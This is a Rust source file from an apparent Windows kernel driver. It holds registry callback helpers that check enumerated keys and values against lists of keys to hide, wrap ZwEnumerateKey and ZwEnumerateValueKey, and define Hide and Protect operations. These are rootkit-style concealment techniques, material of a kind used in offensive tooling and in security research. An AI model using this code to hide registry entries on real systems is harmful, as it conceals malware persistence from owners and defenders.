#![allow(non_upper_case_globals)]

use wdk_sys::*;
use wdk::println;
use wdk_sys::{
    ntddk::{ZwEnumerateKey, ZwEnumerateValueKey},
    _KEY_INFORMATION_CLASS::{KeyBasicInformation, KeyNameInformation},
    _KEY_VALUE_INFORMATION_CLASS::{
        KeyValueBasicInformation, KeyValueFullInformation, 
        KeyValueFullInformationAlign64,
    },
};
use core::{
    ffi::c_void, 
    mem::size_of, 
    slice::from_raw_parts
};

use super::{Registry, HIDE_KEYS, HIDE_KEY_VALUES};
use alloc::{format, string::String};

/// Checks if a specified registry key is present in the list of hidden keys.
///
/// This function checks if the provided registry key exists among the list of hidden keys, using
/// the information from the registry operation.
///
/// # Arguments
///
/// * `info` - Pointer to the operation information structure containing registry details.
/// * `key` - The name of the registry key to be checked.
///
/// # Returns
///
/// * Returns `true` if the key is found in the hidden keys list, otherwise returns `false`.
pub unsafe fn check_key(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
    // Extracting pre-information from the registry operation
    let info_class = (*info).PreInformation as *mut REG_ENUMERATE_KEY_INFORMATION;

    match (*info_class).KeyInformationClass {
        // Check for basic key information
        KeyBasicInformation => {
            let basic_information = (*info_class).KeyInformation as *mut KEY_BASIC_INFORMATION;
            let name = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );

            // Construct the full key path
            let key = format!("{key}\\{}", String::from_utf16_lossy(name));
            if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
                return true;
            }
        }
        // Check for key name information
        KeyNameInformation => {
            let basic_information = (*info_class).KeyInformation as *mut KEY_NAME_INFORMATION;
            let name = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );

            // Construct the full key path
            let key = format!("{key}\\{}", String::from_utf16_lossy(name));
            if Registry::check_key(key.clone(), HIDE_KEYS.lock()) {
                return true;
            }
        }
        _ => {}
    }

    false
}

/// Checks if a specified registry key-value pair is present in the list of hidden key-values.
///
/// This function checks if the provided registry key-value pair exists among the list of hidden key-values,
/// using information from the registry value operation.
///
/// # Arguments
///
/// * `info` - Pointer to the operation information structure containing registry value details.
/// * `key` - The name of the registry key associated with the value to be checked.
///
/// # Returns
///
/// * Returns `true` if the key-value pair is found in the hidden key-values list, otherwise returns `false`.
pub unsafe fn check_key_value(info: *mut REG_POST_OPERATION_INFORMATION, key: String) -> bool {
    // Extracting pre-information from the registry operation
    let info_class = (*info).PreInformation as *const REG_ENUMERATE_VALUE_KEY_INFORMATION;

    match (*info_class).KeyValueInformationClass {
        // Check for basic key value information
        KeyValueBasicInformation => {
            let value = (*info_class).KeyValueInformation as *const KEY_VALUE_BASIC_INFORMATION;
            let name = from_raw_parts(
                (*value).Name.as_ptr(),
                ((*value).NameLength / size_of::<u16>() as u32) as usize,
            );

            let value = String::from_utf16_lossy(name);
            if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
                return true;
            }
        }
        // Check for full key value information
        KeyValueFullInformationAlign64 | KeyValueFullInformation => {
            let value = (*info_class).KeyValueInformation as *const KEY_VALUE_FULL_INFORMATION;
            let name = from_raw_parts(
                (*value).Name.as_ptr(),
                ((*value).NameLength / size_of::<u16>() as u32) as usize,
            );
            let value = String::from_utf16_lossy(name);

            if Registry::check_target(key.clone(), value.clone(), HIDE_KEY_VALUES.lock()) {
                return true;
            }
        }
        _ => {}
    }

    false
}

/// Enumerates the specified registry key and retrieves its name.
///
/// This function enumerates the registry key based on the provided index and information class,
/// returning the key name in the desired format.
///
/// # Arguments
///
/// * `key_handle` - Handle of the target registry key.
/// * `index` - The index to be enumerated.
/// * `buffer` - Buffer that will store the registry key information.
/// * `buffer_size` - Size of the buffer.
/// * `key_information` - Type of information to retrieve about the target registry key.
/// * `result_length` - Pointer to store the size of the result.
///
/// # Returns
///
/// * Returns `Some(String)` containing the name of the registry key if successful,
///   otherwise returns `None`.
pub unsafe fn enumerate_key(
    key_handle: HANDLE,
    index: u32,
    buffer: *mut u8,
    buffer_size: u32,
    key_information: KEY_INFORMATION_CLASS,
    result_length: &mut u32,
) -> Option<String> {
    // Enumerate the registry key using ZwEnumerateKey
    let status = ZwEnumerateKey(
        key_handle,
        index,
        key_information,
        buffer as *mut c_void,
        buffer_size,
        result_length,
    );

    // Check if there are no more entries
    if status == STATUS_NO_MORE_ENTRIES {
        return None;
    }

    // Check if the operation was successful
    if !NT_SUCCESS(status) {
        println!("ZwEnumerateKey Failed With Status: {status}");
        return None;
    }

    // Process the key information based on the specified class
    match key_information {
        KeyBasicInformation => {
            let basic_information = &*(buffer as *const KEY_BASIC_INFORMATION);
            let name = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );

            Some(String::from_utf16_lossy(name))
        }
        KeyNameInformation => {
            let basic_information = &*(buffer as *const KEY_NAME_INFORMATION);
            let name = from_raw_parts(
                (*basic_information).Name.as_ptr(),
                ((*basic_information).NameLength / size_of::<u16>() as u32) as usize,
            );

            Some(String::from_utf16_lossy(name))
        }
        _ => None,
    }
}

/// Enumerates the values of the specified registry key.
///
/// This function enumerates the values of the registry key based on the provided index and information class,
/// returning the value name in the desired format.
///
/// # Arguments
///
/// * `key_handle` - Handle of the target registry key.
/// * `index` - The index to be enumerated.
/// * `buffer` - Buffer that will store the registry key values.
/// * `buffer_size` - Size of the buffer.
/// * `key_value_information` - Type of information to retrieve about the registry key value.
/// * `result_length` - Pointer to store the size of the result.
///
/// # Returns
///
/// * Returns `Some(String)` containing the name of the registry key value if successful,
///   otherwise returns `None`.
pub unsafe fn enumerate_value_key(
    key_handle: HANDLE,
    index: u32,
    buffer: *mut u8,
    buffer_size: u32,
    key_value_information: KEY_VALUE_INFORMATION_CLASS,
    result_length: &mut u32,
) -> Option<String> {
    // Enumerate the registry value using ZwEnumerateValueKey
    let status = ZwEnumerateValueKey(
        key_handle,
        index,
        key_value_information,
        buffer as *mut c_void,
        buffer_size,
        result_length,
    );

    // Check if there are no more entries
    if status == STATUS_NO_MORE_ENTRIES {
        return None;
    }

    // Check if the operation was successful
    if !NT_SUCCESS(status) {
        println!("ZwEnumerateValueKey Failed With Status: {status}");
        return None;
    }

    // Process the key value information based on the specified class
    match key_value_information {
        KeyValueBasicInformation | KeyValueFullInformationAlign64 | KeyValueFullInformation => {
            let value_info = &*(buffer as *const KEY_VALUE_FULL_INFORMATION);
            let value_name_utf16: &[u16] = from_raw_parts(
                value_info.Name.as_ptr(),
                (value_info.NameLength / size_of::<u16>() as u32) as usize,
            );

            Some(String::from_utf16_lossy(value_name_utf16))
        }
        _ => None,
    }
}

/// Trait for accessing the object in registry information.
///
/// This trait defines a method to retrieve a pointer to the registry object from different registry information structures.
pub trait RegistryInfo {
    /// Retrieves a pointer to the registry object.
    ///
    /// # Returns
    ///
    /// * A raw pointer to the registry object.
    fn get_object(&self) -> *mut c_void;
}

impl RegistryInfo for REG_DELETE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_DELETE_VALUE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_SET_VALUE_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_QUERY_KEY_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

impl RegistryInfo for REG_POST_OPERATION_INFORMATION {
    fn get_object(&self) -> *mut c_void {
        self.Object
    }
}

/// Enum representing the types of operations to be done with the Registry.
pub enum Type {
    /// Hides the specified key or key-value.
    Hide,
    /// Protects the specified key or key-value from being modified.
    Protect,
}
